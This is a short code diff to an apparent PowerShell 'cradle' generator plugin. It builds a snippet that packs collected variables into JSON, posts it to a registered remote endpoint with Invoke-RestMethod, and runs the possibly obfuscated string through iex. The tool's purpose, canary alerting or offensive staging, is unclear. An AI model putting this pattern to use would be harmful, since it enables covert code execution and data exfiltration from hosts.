@@ -54,10 +54,9 @@ class BaseCradlePlugin(ABC):
         snippet = f"""
 $responseJson = @{{
 {"\n".join(f"\t{x} = {header_var_dict[x]} | Out-String" for x in header_var_dict.keys())}
-}} | ConvertTo-Json
-Invoke-RestMethod -Uri "{self._endpoint_registry.get_cradle_command(notification_channel.uid)}" -Method Post -Body
+}} | ConvertTo-Json; Invoke-RestMethod -Uri "{self._endpoint_registry.get_cradle_command(notification_channel.uid)}" -Method Post -Body $responseJson
         """
-        return f".({sgr(snippet)});"
+        return f"({sgr(snippet)})|iex;"
 
     
     def validate(self, inst: CradleInstance, options: dict) -> List[str]:
